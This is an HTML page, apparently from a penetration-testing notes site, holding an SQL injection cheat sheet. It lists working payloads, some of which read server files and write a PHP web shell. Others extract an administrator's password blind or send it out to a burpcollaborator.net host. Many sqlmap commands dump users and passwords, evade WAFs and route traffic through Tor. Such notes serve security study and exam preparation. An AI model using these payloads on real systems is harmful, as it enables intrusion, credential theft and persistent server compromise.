+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Post Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Post Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post_exploitation/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post_exploitation/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../oscp_tips/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSCP Tips
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="sqli">SQLi</h1>
+<p>{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}</p>
+<p>{% embed url="https://sqlwiki.netspi.com/#mysql" %}</p>
+<h2 id="common">Common</h2>
+<div class="highlight"><pre><span></span><code>/?q=1
+/?q=1&#39;
+/?q=1&quot;
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*&#39;*/
+/?q=1/*!1111&#39;*/
+/?q=1&#39;||&#39;asd&#39;||&#39;   &lt;== concat string
+/?q=1&#39; or &#39;1&#39;=&#39;1
+/?q=1 or 1=1
+/?q=&#39;or&#39;&#39;=&#39;
+/?q=(1)or(0)=(1)
+
+# Useful payloads
+&#39; WAITFOR DELAY &#39;0:0:5&#39;--
+&#39;;WAITFOR DELAY &#39;0:0:5&#39;-- 
+&#39;)) or sleep(5)=&#39;
+;waitfor delay &#39;0:0:5&#39;--
+);waitfor delay &#39;0:0:5&#39;--
+&#39;;waitfor delay &#39;0:0:5&#39;--
+&quot;;waitfor delay &#39;0:0:5&#39;--
+&#39;);waitfor delay &#39;0:0:5&#39;--
+&quot;);waitfor delay &#39;0:0:5&#39;--
+));waitfor delay &#39;0:0:5&#39;--
+</code></pre></div>
+<h2 id="polyglot">Polyglot</h2>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39;, &quot;,&#39;</span><span class="p">),</span><span class="ss">&quot;), (),., * /, &lt;! -, -</span>
+<span class="ss">SLEEP(1) /*&#39; or SLEEP(1) or &#39;&quot;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="ss">&quot;*/</span>
+<span class="ss">IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*&#39;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#39;|&quot;</span><span class="n">XOR</span><span class="p">(</span><span class="k">IF</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">,</span><span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">2000000</span><span class="p">,</span><span class="n">SHA1</span><span class="p">(</span><span class="mi">0</span><span class="n">xDE7EC71F1</span><span class="p">)),</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="k">OR</span><span class="err">&quot;</span><span class="o">*/</span>
+</code></pre></div>
+<h2 id="resources-by-type">Resources by type</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># MySQL:</span>
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+
+<span class="c1"># MSQQL:</span>
+http://evilsql.com/main/page2.php
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+
+<span class="c1"># ORACLE:</span>
+http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+
+<span class="c1"># POSTGRESQL:</span>
+http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+
+<span class="c1"># Others</span>
+http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
+http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
+http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
+http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
+https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
+http://rails-sqli.org/
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+</code></pre></div>
+<h2 id="rw-files">R/W files</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Read file</span>
+UNION<span class="w"> </span>SELECT<span class="w"> </span>LOAD_FILE<span class="w"> </span><span class="o">(</span><span class="s2">&quot;etc/passwd&quot;</span><span class="o">)</span>--<span class="w"> </span>
+
+<span class="c1"># Write a file</span>
+UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="s2">&quot;&lt;? system(</span><span class="nv">$_REQUEST</span><span class="s2">[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="w"> </span><span class="s2">&quot;/tmp/shell.php&quot;</span>-
+</code></pre></div>
+<h2 id="blind-sqli"><strong>Blind SQLi</strong></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Conditional Responses</span>
+
+<span class="c1"># Request with:</span>
+Cookie:<span class="w"> </span><span class="nv">TrackingId</span><span class="o">=</span>u5YD3PapBcR4lN3e7Tj4
+
+<span class="w">    </span>In<span class="w"> </span>the<span class="w"> </span>DDBB<span class="w"> </span>it<span class="w"> </span>does:
+<span class="w">    </span>SELECT<span class="w"> </span>TrackingId<span class="w"> </span>FROM<span class="w"> </span>TrackedUsers<span class="w"> </span>WHERE<span class="w"> </span><span class="nv">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;u5YD3PapBcR4lN3e7Tj4&#39;</span><span class="w"> </span>-<span class="w"> </span>If<span class="w"> </span>exists,<span class="w"> </span>show<span class="w"> </span>content<span class="w"> </span>or<span class="w"> </span>“Welcome<span class="w"> </span>back”
+
+<span class="c1"># To detect:</span>
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;+OR+1=1-- OK</span>
+<span class="s1">TrackingId=x&#39;</span>+OR+1<span class="o">=</span><span class="m">2</span>--<span class="w"> </span>KO
+<span class="c1"># User admin exist</span>
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;+UNION+SELECT+&#39;</span>a<span class="s1">&#39;+FROM+users+WHERE+username=&#39;</span>administrator<span class="s1">&#39;-- OK</span>
+<span class="s1"># Password length</span>
+<span class="s1">TrackingId=x&#39;</span>+UNION+SELECT+<span class="s1">&#39;a&#39;</span>+FROM+users+WHERE+username<span class="o">=</span><span class="s1">&#39;administrator&#39;</span>+AND+length<span class="o">(</span>password<span class="o">)</span>&gt;1--
+
+<span class="c1"># So, in the cookie header if first letter of password is greater than ‘m’, or ‘t’ or equal to ‘s’ response will be ok.</span>
+
+xyz<span class="s1">&#39; UNION SELECT &#39;</span>a<span class="s1">&#39; FROM Users WHERE Username = &#39;</span>Administrator<span class="s1">&#39; and SUBSTRING(Password, 1, 1) &gt; &#39;</span>m<span class="s1">&#39;--</span>
+<span class="s1">xyz&#39;</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span>FROM<span class="w"> </span>Users<span class="w"> </span>WHERE<span class="w"> </span><span class="nv">Username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>and<span class="w"> </span>SUBSTRING<span class="o">(</span>Password,<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="m">1</span><span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s1">&#39;t&#39;</span>--
+xyz<span class="s1">&#39; UNION SELECT &#39;</span>a<span class="s1">&#39; FROM Users WHERE Username = &#39;</span>Administrator<span class="s1">&#39; and SUBSTRING(Password, 1, 1) = &#39;</span>s<span class="s1">&#39;--</span>
+<span class="s1">z&#39;</span>+UNION+SELECT+<span class="s1">&#39;a&#39;</span>+FROM+users+WHERE+username<span class="o">=</span><span class="s1">&#39;administrator&#39;</span>+AND+substring<span class="o">(</span>password,6,1<span class="o">)=</span><span class="s1">&#39;§a§&#39;</span>--
+
+<span class="c1"># Force conditional responses</span>
+
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS ERROR IF OK</span>
+<span class="s1">TrackingId=x&#39;</span>+UNION+SELECT+CASE+WHEN+<span class="o">(</span><span class="nv">1</span><span class="o">=</span><span class="m">2</span><span class="o">)</span>+THEN+to_char<span class="o">(</span><span class="m">1</span>/0<span class="o">)</span>+ELSE+NULL+END+FROM+dual--<span class="w"> </span>RETURNS<span class="w"> </span>NORMALLY<span class="w"> </span>IF<span class="w"> </span>KO
+<span class="nv">TrackingId</span><span class="o">=</span><span class="s1">&#39;+UNION+SELECT+CASE+WHEN+(username=&#39;</span>administrator<span class="s1">&#39;+AND+substr(password,3,1)=&#39;</span>§a§<span class="s1">&#39;)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--;</span>
+
+<span class="s1"># Time delays</span>
+<span class="s1">TrackingId=x&#39;</span>%3BSELECT+CASE+WHEN+<span class="o">(</span><span class="nv">1</span><span class="o">=</span><span class="m">1</span><span class="o">)</span>+THEN+pg_sleep<span class="o">(</span><span class="m">10</span><span class="o">)</span>+ELSE+pg_sleep<span class="o">(</span><span class="m">0</span><span class="o">)</span>+END--
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;; IF (SELECT COUNT(username) FROM Users WHERE username = &#39;</span>Administrator<span class="s1">&#39; AND SUBSTRING(password, 1, 1) &gt; &#39;</span>m<span class="s1">&#39;) = 1 WAITFOR DELAY &#39;</span><span class="m">0</span>:0:<span class="o">{</span>delay<span class="o">}</span><span class="s1">&#39;--</span>
+<span class="s1">TrackingId=x&#39;</span><span class="p">;</span><span class="w"> </span>IF<span class="w"> </span><span class="o">(</span><span class="nv">1</span><span class="o">=</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>WAITFOR<span class="w"> </span>DELAY<span class="w"> </span><span class="s1">&#39;0:0:10&#39;</span>--
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;||pg_sleep(10)--</span>
+<span class="s1">TrackingId=x&#39;</span>%3BSELECT+CASE+WHEN+<span class="o">(</span><span class="nv">1</span><span class="o">=</span><span class="m">1</span><span class="o">)</span>+THEN+pg_sleep<span class="o">(</span><span class="m">10</span><span class="o">)</span>+ELSE+pg_sleep<span class="o">(</span><span class="m">0</span><span class="o">)</span>+END--
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;%3BSELECT+CASE+WHEN+(username=&#39;</span>administrator<span class="s1">&#39;+AND+substring(password,1,1)=&#39;</span>§a§<span class="s1">&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span>
+
+<span class="s1"># Out-of-Band OAST (Collaborator)</span>
+<span class="s1">Asynchronous response</span>
+
+<span class="s1"># Confirm:</span>
+<span class="s1">TrackingId=x&#39;</span>+UNION+SELECT+extractvalue<span class="o">(</span>xmltype<span class="o">(</span><span class="s1">&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//x.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#39;</span><span class="o">)</span>,<span class="s1">&#39;/l&#39;</span><span class="o">)</span>+FROM+dual--
+
+<span class="c1"># Exfil:</span>
+<span class="nv">TrackingId</span><span class="o">=</span>x<span class="s1">&#39;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#39;</span>Administrator<span class="s1">&#39;);exec(&#39;</span>master..xp_dirtree<span class="w"> </span><span class="s2">&quot;//&#39;+@p+&#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;</span><span class="s1">&#39;)--</span>
+<span class="s1">TrackingId=x&#39;</span>+UNION+SELECT+extractvalue<span class="o">(</span>xmltype<span class="o">(</span><span class="s1">&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#39;</span><span class="o">||(</span>SELECT+password+FROM+users+WHERE+username%3d<span class="s1">&#39;administrator&#39;</span><span class="o">)||</span><span class="s1">&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#39;</span><span class="o">)</span>,<span class="s1">&#39;/l&#39;</span><span class="o">)</span>+FROM+dual--
+</code></pre></div>
+<h2 id="second-order-sqli"><strong>Second Order SQLi</strong></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:</span>
+<span class="m">1</span>.<span class="w"> </span>Firstly,<span class="w"> </span>we<span class="w"> </span>STORE<span class="w"> </span>a<span class="w"> </span>particular<span class="w"> </span>user-supplied<span class="w"> </span>input<span class="w"> </span>value<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>DB<span class="w"> </span>and
+<span class="m">2</span>.<span class="w"> </span>Secondly,<span class="w"> </span>we<span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span>stored<span class="w"> </span>value<span class="w"> </span>to<span class="w"> </span>exploit<span class="w"> </span>a<span class="w"> </span>vulnerability<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>vulnerable<span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span><span class="nb">source</span><span class="w"> </span>code<span class="w"> </span>which<span class="w"> </span>constructs<span class="w"> </span>the<span class="w"> </span>dynamic<span class="w"> </span>query<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>web<span class="w"> </span>application.
+
+<span class="c1"># Example payload:</span>
+X<span class="s1">&#39; UNION SELECT user(),version(),database(), 4 --</span>
+<span class="s1">X&#39;</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,2,3,4<span class="w"> </span>--
+
+<span class="c1"># For example, in a password reset query with user &quot;User123&#39; --&quot;:</span>
+
+<span class="nv">$pwdreset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>mysql_query<span class="o">(</span><span class="s2">&quot;UPDATE users SET password=&#39;getrekt&#39; WHERE username=&#39;User123&#39; — &#39; and password=&#39;UserPass@123&#39;&quot;</span><span class="o">)</span><span class="p">;</span>
+
+<span class="c1"># Will be:</span>
+
+<span class="nv">$pwdreset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>mysql_query<span class="o">(</span><span class="s2">&quot;UPDATE users SET password=&#39;getrekt&#39; WHERE username=&#39;User123&#39;&quot;</span><span class="o">)</span><span class="p">;</span>
+
+<span class="c1"># So you don&#39;t need to know the password.</span>
+
+-<span class="w"> </span><span class="nv">User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39; or &#39;</span>asd<span class="s1">&#39;=&#39;</span>asd<span class="w"> </span>it<span class="w"> </span>will<span class="w"> </span><span class="k">return</span><span class="w"> </span>always<span class="w"> </span><span class="nb">true</span>
+-<span class="w"> </span><span class="nv">User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>admin<span class="err">&#39;</span>--<span class="w"> </span>probably<span class="w"> </span>not<span class="w"> </span>check<span class="w"> </span>the<span class="w"> </span>password
+</code></pre></div>
+<h2 id="sqlmap"><strong>sqlmap</strong></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Post</span>
+sqlmap<span class="w"> </span>-r<span class="w"> </span>search-test.txt<span class="w"> </span>-p<span class="w"> </span>tfUPass
+
+<span class="c1"># Get</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://10.11.1.111/index.php?id=1&quot;</span><span class="w"> </span>--dbms<span class="o">=</span>mysql
+
+<span class="c1"># Crawl</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.11.1.111<span class="w"> </span>--dbms<span class="o">=</span>mysql<span class="w"> </span>--crawl<span class="o">=</span><span class="m">3</span>
+
+<span class="c1"># Full auto - FORMS</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;http://10.11.1.111:1337/978345210/index.php&#39;</span><span class="w"> </span>--forms<span class="w"> </span>--dbs<span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--threads<span class="o">=</span><span class="m">4</span><span class="w"> </span>--batch
+<span class="c1"># Columns </span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;http://admin.cronos.htb/index.php&#39;</span><span class="w"> </span>--forms<span class="w"> </span>--dbms<span class="o">=</span>MySQL<span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--threads<span class="o">=</span><span class="m">4</span><span class="w"> </span>--batch<span class="w"> </span>--columns<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-D<span class="w"> </span>admin
+<span class="c1"># Values</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;http://admin.cronos.htb/index.php&#39;</span><span class="w"> </span>--forms<span class="w"> </span>--dbms<span class="o">=</span>MySQL<span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--threads<span class="o">=</span><span class="m">4</span><span class="w"> </span>--batch<span class="w"> </span>--dump<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-D<span class="w"> </span>admin
+
+sqlmap<span class="w"> </span>-o<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://10.11.1.111:1337/978345210/index.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;username=admin&amp;password=pass&amp;submit=+Login+&quot;</span><span class="w"> </span>--method<span class="o">=</span>POST<span class="w"> </span>--level<span class="o">=</span><span class="m">3</span><span class="w"> </span>--threads<span class="o">=</span><span class="m">10</span><span class="w"> </span>--dbms<span class="o">=</span>MySQL<span class="w"> </span>--users<span class="w"> </span>--passwords
+
+<span class="c1"># SQLMAP WAF bypass</span>
+
+sqlmap<span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--random-agent<span class="w"> </span>--user-agent<span class="w"> </span>-v3<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="o">=</span><span class="m">10</span><span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>--dbms<span class="o">=</span><span class="s2">&quot;MySQL&quot;</span><span class="w"> </span>-v3<span class="w"> </span>--technique<span class="w"> </span>U<span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2mysqlblank.py&quot;</span><span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>--dbms<span class="o">=</span><span class="s2">&quot;MySQL&quot;</span><span class="w"> </span>-v3<span class="w"> </span>--technique<span class="w"> </span>U<span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2comment&quot;</span><span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>-v3<span class="w"> </span>--technique<span class="o">=</span>T<span class="w"> </span>--no-cast<span class="w"> </span>--fresh-queries<span class="w"> </span>--banner
+sqlmap<span class="w"> </span>-u<span class="w"> </span>http://www.example.com/index?id<span class="o">=</span><span class="m">1</span><span class="w"> </span>--level<span class="w"> </span><span class="m">2</span><span class="w"> </span>--risk<span class="w"> </span><span class="m">3</span><span class="w"> </span>--batch<span class="w"> </span>--dbs
+
+
+sqlmap<span class="w"> </span>-f<span class="w"> </span>-b<span class="w"> </span>--current-user<span class="w"> </span>--current-db<span class="w"> </span>--is-dba<span class="w"> </span>--users<span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--random-agent<span class="w"> </span>--user-agent<span class="w"> </span>-v3<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="o">=</span><span class="m">10</span><span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>--risk<span class="w"> </span><span class="m">3</span><span class="w"> </span>--level<span class="w"> </span><span class="m">5</span><span class="w"> </span>--random-agent<span class="w"> </span>--proxy<span class="w"> </span>http://123.57.48.140:8080<span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>--random-agent<span class="w"> </span>--dbms<span class="o">=</span>MYSQL<span class="w"> </span>--dbs<span class="w"> </span>--technique<span class="o">=</span>B<span class="s2">&quot;</span>
+<span class="s2">sqlmap --identify-waf --random-agent -v 3 --dbs</span>
+
+<span class="s2">1 : --identify-waf --random-agent -v 3 --tamper=&quot;</span>between,randomcase,space2comment<span class="s2">&quot; --dbs</span>
+<span class="s2">2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3</span>
+
+<span class="s2">sqlmap --threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump</span>
+<span class="s2">sqlmap --tables -D miss_db --is-dba --threads=&quot;</span><span class="m">10</span><span class="s2">&quot; --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent</span>
+<span class="s2">sqlmap -u http://192.168.0.107/test.php?id=1 -v 3 --dbms &quot;</span>MySQL<span class="s2">&quot; --technique U -p id --batch --tamper &quot;</span>space2morehash.py<span class="s2">&quot;</span>
+<span class="s2">sqlmap --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2</span>
+<span class="s2">sqlmap -v3 --dbms=&quot;</span>MySQL<span class="s2">&quot; --risk=3 --level=3 --technique=BU --tamper=&quot;</span>space2mysqlblank.py<span class="s2">&quot; --random-agent -D damksa_abr -T admin,jobadmin,member --colu</span>
+
+<span class="s2">sqlmap --wizard</span>
+<span class="s2">sqlmap --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql</span>
+<span class="s2">sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql</span>
+<span class="s2">sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql</span>
+
+<span class="s2"># Tamper suggester</span>
+<span class="s2">https://github.com/m4ll0k/Atlas</span>
+
+<span class="s2">--tamper &quot;</span>randomcase.py<span class="s2">&quot; --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms &quot;</span>MySQL<span class="s2">&quot; --current-db --random-agent</span>
+<span class="s2">--tamper &quot;</span>randomcase.py<span class="s2">&quot; --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms &quot;</span>MySQL<span class="s2">&quot; --current-db --random-agent -D &quot;</span>pache_PACHECOCARE<span class="s2">&quot; --tables</span>
+<span class="s2">--tamper &quot;</span>randomcase.py<span class="s2">&quot; --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms &quot;</span>MySQL<span class="s2">&quot; --current-db --random-agent -D &quot;</span>pache_PACHECOCARE<span class="s2">&quot; -T &quot;</span>edt_usuarios<span class="s2">&quot; --columns</span>
+<span class="s2">--tamper &quot;</span>randomcase.py<span class="s2">&quot; --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms &quot;</span>MySQL<span class="s2">&quot; --current-db --random-agent -D &quot;</span>pache_PACHECOCARE<span class="s2">&quot; -T &quot;</span>edt_usuarios<span class="s2">&quot; -C &quot;</span>ud,email,usuario,contra<span class="s2">&quot; --dump</span>
+<span class="s2"># Tamper list</span>
+<span class="s2">between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percent</span>
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.expand", "search.highlight", "search.share", "content.code.annotate", "content.tooltips", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
